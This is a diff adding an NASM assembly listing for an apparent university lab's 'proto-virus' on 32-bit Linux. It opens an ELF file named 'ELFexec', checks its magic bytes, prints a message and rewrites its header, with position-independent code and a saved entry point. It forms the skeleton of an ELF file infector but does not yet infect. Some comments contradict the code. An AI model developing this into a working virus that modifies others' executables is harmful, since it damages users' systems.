@@ -1,0 +1,189 @@
+     1                                  %macro	syscall1 2
+     2                                  	mov	ebx, %2
+     3                                  	mov	eax, %1
+     4                                  	int	0x80
+     5                                  %endmacro
+     6                                  
+     7                                  %macro	syscall3 4
+     8                                  	mov	edx, %4
+     9                                  	mov	ecx, %3
+    10                                  	mov	ebx, %2
+    11                                  	mov	eax, %1
+    12                                  	int	0x80
+    13                                  %endmacro
+    14                                  
+    15                                  %macro  exit 1
+    16                                  	syscall1 1, %1
+    17                                  %endmacro
+    18                                  
+    19                                  %macro  write 3
+    20                                  	syscall3 4, %1, %2, %3
+    21                                  %endmacro
+    22                                  
+    23                                  %macro  read 3
+    24                                  	syscall3 3, %1, %2, %3
+    25                                  %endmacro
+    26                                  
+    27                                  %macro  open 3
+    28                                  	syscall3 5, %1, %2, %3
+    29                                  %endmacro
+    30                                  
+    31                                  %macro  lseek 3
+    32                                  	syscall3 19, %1, %2, %3
+    33                                  %endmacro
+    34                                  
+    35                                  %macro  close 1
+    36                                  	syscall1 6, %1
+    37                                  %endmacro
+    38                                  
+    39                                  %define	STK_RES	200
+    40                                  %define	RDWR	2
+    41                                  %define	SEEK_END 2
+    42                                  %define SEEK_SET 0
+    43                                  
+    44                                  %define ENTRY		24
+    45                                  %define PHDR_start	28
+    46                                  %define	PHDR_size	32
+    47                                  %define PHDR_memsize	20	
+    48                                  %define PHDR_filesize	16
+    49                                  %define	PHDR_offset	4
+    50                                  %define	PHDR_vaddr	8
+    51                                  %define ELFHDR_size 52
+    52                                  %define ELFHDR_phoff	28
+    53                                  %define STDOUT		1
+    54                                  
+    55                                  ;Stack Locations macros: (sub the size of ELF_header(52))
+    56                                  %define FD dword [ebp-4]
+    57                                  %define ELF_header ebp-56
+    58                                  %define FileSize dword [ebp-60] 	
+    59                                  	
+    60                                  	global _start
+    61                                  
+    62                                  	section .text
+    63                                  _start:	
+    64 00000000 55                      	push	ebp
+    65 00000001 89E5                    	mov	ebp, esp
+    66 00000003 81ECC8000000            	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
+    67                                  	;CODE START
+    68                                  
+    69 00000009 E814010000              	call get_loc_ebx
+    70 0000000E 81C3[ED000000]          	add ebx, FileName
+    71                                  	open ebx,RDWR, 0x777
+    71                              <1>  syscall3 5, %1, %2, %3
+    71 00000014 BA77070000          <2>  mov edx, %4
+    71 00000019 B902000000          <2>  mov ecx, %3
+    71 0000001E 89DB                <2>  mov ebx, %2
+    71 00000020 B805000000          <2>  mov eax, %1
+    71 00000025 CD80                <2>  int 0x80
+    72 00000027 8945FC                  	mov FD, eax					;save the file descriptor
+    73 0000002A 837DFCFF                	cmp FD, -1
+    74 0000002E 0F84AD000000            	je Exit
+    75                                  
+    76 00000034 8D4DC8                  	lea ecx, [ELF_header]
+    77                                  	read FD,ecx,ELFHDR_size			;read the header of ELF
+    77                              <1>  syscall3 3, %1, %2, %3
+    77 00000037 BA34000000          <2>  mov edx, %4
+    77 0000003C 89C9                <2>  mov ecx, %3
+    77 0000003E 8B5DFC              <2>  mov ebx, %2
+    77 00000041 B803000000          <2>  mov eax, %1
+    77 00000046 CD80                <2>  int 0x80
+    78                                  
+    79 00000048 817DC87F454C46          	cmp dword [ELF_header], 0x464C457F ; compare the first 4 bytes(MAGICs) of the file to check if is ELF
+    80 0000004F 7564                    	jne Failed_Exit
+    81                                  
+    82 00000051 E8D9000000              	call get_loc_ecx
+    83 00000056 81C1[F5000000]          	add  ecx, OutStr
+    84                                  	write STDOUT, ecx, 32
+    84                              <1>  syscall3 4, %1, %2, %3
+    84 0000005C BA20000000          <2>  mov edx, %4
+    84 00000061 89C9                <2>  mov ecx, %3
+    84 00000063 BB01000000          <2>  mov ebx, %2
+    84 00000068 B804000000          <2>  mov eax, %1
+    84 0000006D CD80                <2>  int 0x80
+    85                                  
+    86 0000006F B800800408              	mov eax, 0x8048000					; ELF base address
+    87 00000074 0345C4                  	add eax, FileSize
+    88                                  	lseek FD, 0, SEEK_SET 				;set the file pointer to the end of the file
+    88                              <1>  syscall3 19, %1, %2, %3
+    88 00000077 BA00000000          <2>  mov edx, %4
+    88 0000007C B900000000          <2>  mov ecx, %3
+    88 00000081 8B5DFC              <2>  mov ebx, %2
+    88 00000084 B813000000          <2>  mov eax, %1
+    88 00000089 CD80                <2>  int 0x80
+    89                                  
+    90 0000008B 8D4DC8                  	lea ecx, [ELF_header]				;store the memory offset
+    91                                  	write FD,ecx,ELFHDR_size		;write the modified header back to the fule
+    91                              <1>  syscall3 4, %1, %2, %3
+    91 0000008E BA34000000          <2>  mov edx, %4
+    91 00000093 89C9                <2>  mov ecx, %3
+    91 00000095 8B5DFC              <2>  mov ebx, %2
+    91 00000098 B804000000          <2>  mov eax, %1
+    91 0000009D CD80                <2>  int 0x80
+    92                                  	
+    93                                  
+    94                                  	.close_the_modified_file:
+    95                                  	close FD
+    95                              <1>  syscall1 6, %1
+    95 0000009F 8B5DFC              <2>  mov ebx, %2
+    95 000000A2 B806000000          <2>  mov eax, %1
+    95 000000A7 CD80                <2>  int 0x80
+    96                                  
+    97                                  
+    98                                  
+    99                                  VirusExit:
+   100                                         exit 0            ; Termination if all is OK and no previous code to jump to
+   100                              <1>  syscall1 1, %1
+   100 000000A9 BB00000000          <2>  mov ebx, %2
+   100 000000AE B801000000          <2>  mov eax, %1
+   100 000000B3 CD80                <2>  int 0x80
+   101                                                           ; (also an example for use of above macros)
+   102                                  Failed_Exit:
+   103                                  	close FD
+   103                              <1>  syscall1 6, %1
+   103 000000B5 8B5DFC              <2>  mov ebx, %2
+   103 000000B8 B806000000          <2>  mov eax, %1
+   103 000000BD CD80                <2>  int 0x80
+   104                                  	write STDOUT, Failstr, 13
+   104                              <1>  syscall3 4, %1, %2, %3
+   104 000000BF BA0D000000          <2>  mov edx, %4
+   104 000000C4 B9[15010000]        <2>  mov ecx, %3
+   104 000000C9 BB01000000          <2>  mov ebx, %2
+   104 000000CE B804000000          <2>  mov eax, %1
+   104 000000D3 CD80                <2>  int 0x80
+   105                                  	exit 0
+   105                              <1>  syscall1 1, %1
+   105 000000D5 BB00000000          <2>  mov ebx, %2
+   105 000000DA B801000000          <2>  mov eax, %1
+   105 000000DF CD80                <2>  int 0x80
+   106                                  Exit:
+   107                                  	exit -1	
+   107                              <1>  syscall1 1, %1
+   107 000000E1 BBFFFFFFFF          <2>  mov ebx, %2
+   107 000000E6 B801000000          <2>  mov eax, %1
+   107 000000EB CD80                <2>  int 0x80
+   108                                  	
+   109 000000ED 454C466578656300        FileName:	db "ELFexec", 0
+   110 000000F5 546865206C61622039-     OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
+   110 000000FE 2070726F746F2D7669-
+   110 00000107 72757320737472696B-
+   110 00000110 6573210A00         
+   111 00000115 70657268617073206E-     Failstr:        db "perhaps not", 10 , 0
+   111 0000011E 6F740A00           
+   112                                  	
+   113                                  
+   114                                  get_loc_ebx:
+   115 00000122 E800000000              	call .next_i
+   116                                  	.next_i:
+   117 00000127 5B                      		pop ebx
+   118 00000128 81EB[27010000]          		sub ebx, .next_i
+   119 0000012E C3                      		ret
+   120                                  	
+   121                                  get_loc_ecx:
+   122 0000012F E800000000              	call .next_i
+   123                                  	.next_i:
+   124 00000134 59                      		pop ecx
+   125 00000135 81E9[34010000]          		sub ecx, .next_i
+   126 0000013B C3                      		ret
+   127                                  
+   128 0000013C [A9000000]              PreviousEntryPoint: dd VirusExit
+   129                                  virus_end:
